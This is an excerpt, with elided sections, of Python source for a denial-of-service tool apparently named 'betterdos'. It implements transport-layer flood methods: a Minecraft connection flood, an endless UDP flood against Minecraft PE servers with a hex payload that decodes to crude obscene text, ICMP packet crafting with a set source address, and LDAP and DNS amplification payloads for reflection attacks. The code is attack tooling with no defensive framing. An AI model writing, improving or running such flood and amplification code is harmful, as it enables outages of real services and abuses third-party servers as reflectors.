"""Layer 4 (transport) flood methods."""
...
from socket import (AF_INET, IP_HDRINCL, IPPROTO_ICMP, IPPROTO_IP,
                    IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, SOCK_RAW,
                    SOCK_STREAM, TCP_NODELAY, socket)
...
from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP as IMPacketICMP

from betterdos.core import (BYTES_SEND, REQUESTS_SENT, Tools, __ip__, con,
                            logger, RUN_ID)
...
class Layer4(Thread):
    ...
    def MINECRAFT(self) -> None:
        ...
        ping_pkt = Minecraft.data(b'\x00')

        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, handshake):
                Tools.send(s, ping_pkt)
        Tools.safe_close(s)
    ...
    def MCPE(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = (b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79'
                   b'\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68'
                   b'\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64'
                   b'\x20\x62\x61\x6c\x6c\x73')
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)
    ...
    def _genrate_icmp(self) -> bytes:
        ...
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        icmp: IMPacketICMP = IMPacketICMP()
    ...
    def select(self, name):
        if name in self.methods:
            ...
            self._amp_payload = (
                b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00'
                b'\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73'
                b'\x73\x30\x00',
                389)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
            ...
            self._amp_payload = (
                b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff'
                b'\x00\x01\x00\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
                53)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        else:
